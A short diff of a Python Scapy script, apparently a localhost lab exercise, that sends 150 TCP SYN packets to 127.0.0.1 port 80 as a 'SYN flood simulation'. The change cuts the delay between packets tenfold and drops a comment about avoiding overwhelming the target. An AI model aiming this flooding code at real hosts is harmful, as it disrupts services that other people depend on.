@@ -180,9 +180,9 @@ import time
 target_ip = "127.0.0.1"
 target_port = 80
 
-for _ in range(150):
+for i in range(150):
     send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=0)
-    time.sleep(0.1)  # Small delay to avoid overwhelming
+    time.sleep(0.01)  # Small delay
 
 print("SYN flood simulation complete.")
 ```
